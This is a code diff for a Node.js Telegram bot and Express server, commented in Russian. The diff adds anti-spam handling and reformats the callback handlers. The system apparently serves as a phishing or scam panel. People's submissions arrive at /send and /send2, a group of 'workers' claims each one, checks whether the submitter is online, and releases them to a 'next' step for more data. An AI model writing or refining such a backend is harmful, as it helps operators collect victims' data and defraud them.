@@ -60,19 +60,20 @@ let seenUsers = {};
 let onlineUsers = {};
 let bannedUsers = {};
 let userStatus = {};
+let extraSentUsers = {}; // 🔥 антиспам
 
 // ===== ONLINE =====
 function isOnline(id) {
   return onlineUsers[id] && Date.now() - onlineUsers[id] < 20000;
 }
 
-// ===== РЕГИСТРАЦИЯ ЮЗЕРА =====
+// ===== РЕГИСТРАЦИЯ =====
 workerBot.onText(/\/start/, (msg) => {
   const username = msg.from.username;
   const id = msg.chat.id;
 
   if (!username) {
-    return safeSend(workerBot, id, "❌ У тебя нет username в Telegram");
+    return safeSend(workerBot, id, "❌ У тебя нет username");
   }
 
   usersByUsername[username.toLowerCase()] = id;
@@ -87,7 +88,7 @@ function isMod(id) {
   return id === adminId || moderators.includes(id);
 }
 
-// ===== МОДЕРАТОРЫ =====
+// ===== МОДЕРЫ =====
 workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
   if (msg.chat.id !== adminId) return;
 
@@ -95,7 +96,7 @@ workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
   const id = usersByUsername[username];
 
   if (!id) {
-    return safeSend(workerBot, adminId, "❌ Он не писал боту /start");
+    return safeSend(workerBot, adminId, "❌ Он не писал /start");
   }
 
   if (!moderators.includes(id)) {
@@ -159,6 +160,11 @@ app.post("/send", async (req, res) => {
   if (!id) return res.json({ ok: false });
   if (bannedUsers[id]) return res.json({ ok: false });
 
+  // 🔥 сброс старой заявки
+  delete takenRequests[id];
+  delete fullMessages[id];
+  delete extraSentUsers[id];
+
   const isRepeat = seenUsers[id];
   seenUsers[id] = true;
 
@@ -203,9 +209,18 @@ app.get("/status/:id", (req, res) => {
   res.json({ status: userStatus[req.params.id] || "wait" });
 });
 
-// ===== ДОП ДАННЫЕ =====
+// ===== ДОП ДАННЫЕ (АНТИСПАМ) =====
 app.post("/send2", async (req, res) => {
   const { id, value } = req.body;
+
+  if (!id || !value) return res.json({ ok: false });
+
+  if (extraSentUsers[id]) {
+    return res.json({ ok: false });
+  }
+
+  extraSentUsers[id] = true;
+
   const owner = takenRequests[id];
 
   if (owner) {
@@ -224,7 +239,6 @@ workerBot.on("callback_query", async (q) => {
     return workerBot.answerCallbackQuery(q.id, { text: "❌ Нет доступа" });
   }
 
-  // ===== ЗАБРАТЬ =====
   if (data.startsWith("take")) {
 
     if (takenRequests[id]) {
@@ -252,63 +266,48 @@ workerBot.on("callback_query", async (q) => {
 
     if (sent) fullMessages[id] = sent.message_id;
 
-    await safeEdit(
-      workerBot,
-      workerChat,
-      groupMessages[id],
+    await safeEdit(workerBot, workerChat, groupMessages[id],
       `${shortRequests[id]}
 
-👤 Взял: ${user}`,
-      {
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "🔓 Освободить", callback_data: "free_" + id }]
-          ]
-        }
+👤 Взял: ${user}`, {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "🔓 Освободить", callback_data: "free_" + id }]
+        ]
       }
-    );
+    });
 
     workerBot.answerCallbackQuery(q.id);
   }
 
-  // ===== ОСВОБОДИТЬ =====
   if (data.startsWith("free")) {
 
     if (takenRequests[id] !== q.from.id) {
-      return workerBot.answerCallbackQuery(q.id, {
-        text: "❌ Не твоя"
-      });
+      return workerBot.answerCallbackQuery(q.id, { text: "❌ Не твоя" });
     }
 
     delete takenRequests[id];
 
     await safeDelete(workerBot, q.from.id, fullMessages[id]);
 
-    await safeEdit(
-      workerBot,
-      workerChat,
-      groupMessages[id],
-      shortRequests[id],
-      {
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "📥 Забрать", callback_data: "take_" + id }]
-          ]
-        }
+    await safeEdit(workerBot, workerChat, groupMessages[id],
+      shortRequests[id], {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📥 Забрать", callback_data: "take_" + id }]
+        ]
       }
-    );
+    });
 
     workerBot.answerCallbackQuery(q.id, { text: "Освобождено" });
   }
 
-  // ===== ОНЛАЙН =====
   if (data.startsWith("check")) {
     workerBot.answerCallbackQuery(q.id, {
       text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
     });
   }
 
-  // ===== БАН =====
   if (data.startsWith("ban")) {
     bannedUsers[id] = true;
     workerBot.answerCallbackQuery(q.id);
@@ -319,7 +318,6 @@ workerBot.on("callback_query", async (q) => {
     workerBot.answerCallbackQuery(q.id);
   }
 
-  // ===== ДАЛЬШЕ =====
   if (data.startsWith("allow")) {
     userStatus[id] = "next";
     workerBot.answerCallbackQuery(q.id);
